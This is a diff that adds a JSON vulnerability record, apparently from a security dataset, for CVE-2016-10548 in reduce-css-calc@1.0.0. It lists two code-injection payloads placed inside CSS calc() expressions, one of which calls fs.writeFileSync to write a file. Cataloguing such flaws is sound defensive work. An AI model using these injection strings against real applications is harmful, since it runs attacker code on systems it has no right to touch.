@@ -1,0 +1,11 @@
+{
+  "id": "CVE-2016-10548",
+  "upstream": "reduce-css-calc@1.0.0",
+  "keymethod": "#main",
+  "keystring": [
+    "calc( (Buffer(10000)))",
+    "calc( (fs['writeFileSync'](\"reduce-css-calc\", \"\")))"
+  ],
+  "location": "index.js:73:16",
+  "downstreams": []
+}
